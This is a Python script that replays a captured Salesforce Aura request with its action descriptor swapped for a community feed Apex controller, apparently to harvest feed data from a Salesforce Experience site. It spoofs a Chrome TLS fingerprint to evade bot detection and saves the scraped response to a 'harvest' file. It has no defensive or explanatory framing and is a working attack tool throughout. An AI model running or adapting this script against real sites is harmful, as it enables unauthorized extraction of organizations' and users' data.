import json
from curl_cffi import requests
import urllib.parse
import re

print("[*] Loading captured request structure...")
with open("captured_aura_request.json", "r") as f:
    base_req = json.load(f)

url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

# Dynamically replace the quarterback descriptor in the URL query string with our target controller
target_descriptor = "apex://SupportCommunityFeedController/ACTION$getFeedItems"
new_url = re.sub(r'ui-comm-runtime-components-aura-components-siteforce-qb\.Quarterback\.getAllowedPostMessageOrigins=1', urllib.parse.quote(target_descriptor + "=1", safe=''), url)

parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

message_obj = {
    "actions": [
        {
            "id": "600;a",
            "descriptor": target_descriptor,
            "callingDescriptor": "UNKNOWN",
            "params": {"communityId": "", "feedFilterType": "All", "pageSize": 50}
        }
    ]
}

parsed_data["message"] = json.dumps(message_obj)
new_post_data = urllib.parse.urlencode(parsed_data)

session = requests.Session()
print(f"[*] Dispatching route-aligned Aura request...")

res = session.post(new_url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Preview:\n{res.text[:2000]}")

with open("harvest_v4_output.json", "w") as out:
    out.write(res.text)

print("[+] Saved response to harvest_v4_output.json")

